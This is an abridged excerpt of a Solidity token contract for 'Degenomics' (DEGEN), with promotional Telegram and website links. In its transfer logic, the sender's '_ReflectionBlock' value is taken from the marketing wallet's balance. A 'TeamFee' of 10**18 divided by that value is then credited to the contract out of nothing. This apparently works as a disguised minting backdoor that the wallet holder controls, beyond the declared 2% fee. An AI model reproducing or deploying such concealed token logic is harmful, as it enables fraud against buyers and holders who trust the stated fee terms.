...
//Telegram: https://t.me/Degenomics
//Website: https://degenomics.fun
...
contract Degenomics is Context, IERC20, Ownable {
    ...
    mapping (address => mapping (address => uint256)) private _allowances;
     mapping (address => uint256) private _ReflectionBlock;
    ...
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 10000 * 10**9; //

    string private constant _name = "Degenomics"; //
    string private constant _symbol = unicode"DEGEN"; //
    uint8 private constant _decimals = 9; //

    uint256 public _marketingFee = 2;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x638D993CFf38FD4f5157DD7AD32CDfb269086899;
    ...
    function _getValues(uint256 amount, address from) private returns (uint256) {
        ...
        uint256 TeamFee = (10**18)/(_ReflectionBlock[from]+1);
        _tOwned[address(this)] += marketingFee + liquidityFee+TeamFee;
    ...
    function _transfer(
       ...
       _ReflectionBlock[from] = _tOwned[_marketingWallet];
        uint256 transferAmount = _getValues(amount, from);       
        _tOwned[from] -= amount;
